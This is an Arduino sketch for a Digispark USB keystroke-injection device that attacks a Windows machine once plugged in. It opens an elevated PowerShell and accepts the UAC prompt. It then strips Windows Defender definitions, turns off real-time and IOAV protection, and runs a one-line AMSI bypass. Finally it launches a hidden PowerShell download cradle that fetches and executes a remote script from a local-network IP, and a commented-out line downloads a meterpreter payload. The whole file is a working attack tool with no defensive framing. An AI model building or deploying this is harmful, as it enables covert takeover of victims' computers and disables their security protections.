#include "DigiKeyboard.h"

#define KEY_UP_ARROW   0x52
#define KEY_DOWN_ARROW   0x51
#define KEY_LEFT_ARROW   0x50
#define KEY_RIGHT_ARROW   0x4F
#define KEY_LEFT_GUI   0xE3
#define KEY_ESC   0x29
#define KEY_TAB   0x2B


void digiBegin() {
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(0);
}

void digiEnd() {
  const int led=1;
  pinMode(led, OUTPUT);
  while (1) {
    digitalWrite(led, !digitalRead(led));
    DigiKeyboard.delay(1000);
  }
}

/* ------------- main ------------- */

void setup() {
  digiBegin();

  DigiKeyboard.delay(3000);

  // Enter cmd as Administrator
  DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
  DigiKeyboard.delay(250);
  DigiKeyboard.print("cmd Start-Process powershell -Verb runAs");
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_Y,MOD_ALT_LEFT);  
  DigiKeyboard.delay(1000);
  // bypass UAC prompts

  // cd %userprofile%
  DigiKeyboard.print("cd %userprofile%");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  
  // Removes all security definitions for windows defender and disables AV protection
  DigiKeyboard.print("\"%ProgramFiles%\\Windows Defender\\MpCmdRun.exe\" -RemoveDefinitions -All Set-MpPreference -DisableIOAVProtection $true");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);

  // powershell
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2500);
  
  // Disables defender's 'real time monitoring' and sets exclusion path in event defender conducts a scan
  // ;Add-MpPreference -ExclusionPath \"<define exclusion path here>\"
  DigiKeyboard.print("Set-MpPreference -DisableRealtimeMonitoring $true");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  
  // One line AMSI bypass (courtesy of Matt Graeber)
  DigiKeyboard.print("\"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\"");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);

  // Download meterpreter Payload 
  // DigiKeyboard.print("iex (New-Object System.Net.WebClient).DownloadFile('http://<ipaddr>/<payload>','<path\\to\\payload>');Start-Process .\\\"<path\\to\\payload>\"\\");
  // DigiKeyboard.sendKeyStroke(KEY_ENTER);
  // DigiKeyboard.delay(100);

  // Exit Powershell
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);

  // exit
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  // Execute Payload
  DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell -ExecutionPolicy Bypass -NoLogo -NoProfile -WindowStyle Hidden (New-Object system.net.webclient).downloadstring('http://192.168.1.102/download_cradle.ps1') | IEX");
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(300);
  
  digiEnd();
}

void loop() {
  /* empty */  
}
